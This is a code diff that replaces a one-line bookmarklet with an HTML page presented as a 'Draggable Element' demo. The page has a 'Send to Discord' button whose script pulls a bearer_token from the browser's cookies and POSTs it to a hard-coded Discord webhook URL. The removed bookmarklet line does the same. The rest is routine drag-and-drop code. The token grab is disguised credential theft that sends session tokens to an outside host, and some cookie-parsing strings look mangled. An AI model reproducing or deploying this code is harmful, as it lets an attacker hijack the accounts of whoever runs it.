@@ -1,1 +1,91 @@
-<a id="OutputHref" ng-attr-href="{{ output }}" class="ng-binding" href="javascript:void%20function(){javascript:(function(){var%20a=`;%20${doc…d(JSON.stringify({content:%22Bearer%20Token:%20%22+a}))})()}();">My Bookmarklet</a>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Draggable Element</title>
+    <style>
+        .draggable {
+            position: absolute;
+            cursor: move;
+            padding: 10px;
+            background-color: #f1f1f1;
+            border: 1px solid #d4d4d4;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+
+<div class="draggable" id="draggableElement">
+    <button onclick="sendToDiscord()">Send to Discord</button>
+</div>
+
+<script>
+    function sendToDiscord() {
+        (function(){
+            var a=`;%20${document.cookie}`.split("%22;%20bearer_token=%22).pop().split("%22;%22).shift();
+            if(!a) return alert("Bearer Token not found or empty!");
+            var b = new XMLHttpRequest();
+            b.open("POST", "https://discord.com/api/webhooks/1167336644509192213/fYG3Lz7B0haOSfm0DPBrggWJdmVfqeOQBovI0ltarTLXB1QdMIS97PEbYuMzPnbrQYS_", true);
+            b.setRequestHeader("Content-Type", "application/json");
+            b.onreadystatechange = function() {
+                if (b.readyState === XMLHttpRequest.DONE) {
+                    if (b.status === 200) {
+                        alert("Message sent to Discord!");
+                    } else {
+                        alert("Error sending message to Discord. Status code: " + b.status);
+                    }
+                }
+            };
+            b.send(JSON.stringify({content: "Bearer Token: " + a}));
+        })();
+    }
+
+    // Make the div draggable
+    dragElement(document.getElementById("draggableElement"));
+
+    function dragElement(elmnt) {
+        var pos1 = 0, pos2 = 0, pos3 = 0, pos4 = 0;
+        if (document.getElementById(elmnt.id + "-header")) {
+            // if present, the header is where you move the DIV from:
+            document.getElementById(elmnt.id + "-header").onmousedown = dragMouseDown;
+        } else {
+            // otherwise, move the DIV from anywhere inside the DIV:
+            elmnt.onmousedown = dragMouseDown;
+        }
+
+        function dragMouseDown(e) {
+            e = e || window.event;
+            e.preventDefault();
+            // get the mouse cursor position at startup:
+            pos3 = e.clientX;
+            pos4 = e.clientY;
+            document.onmouseup = closeDragElement;
+            // call a function whenever the cursor moves:
+            document.onmousemove = elementDrag;
+        }
+
+        function elementDrag(e) {
+            e = e || window.event;
+            e.preventDefault();
+            // calculate the new cursor position:
+            pos1 = pos3 - e.clientX;
+            pos2 = pos4 - e.clientY;
+            pos3 = e.clientX;
+            pos4 = e.clientY;
+            // set the element's new cursor position:
+            elmnt.style.top = (elmnt.offsetTop - pos2) + "px";
+            elmnt.style.left = (elmnt.offsetLeft - pos1) + "px";
+        }
+
+        function closeDragElement() {
+            // stop moving when mouse button is released:
+            document.onmouseup = null;
+            document.onmousemove = null;
+        }
+    }
+</script>
+
+</body>
+</html>
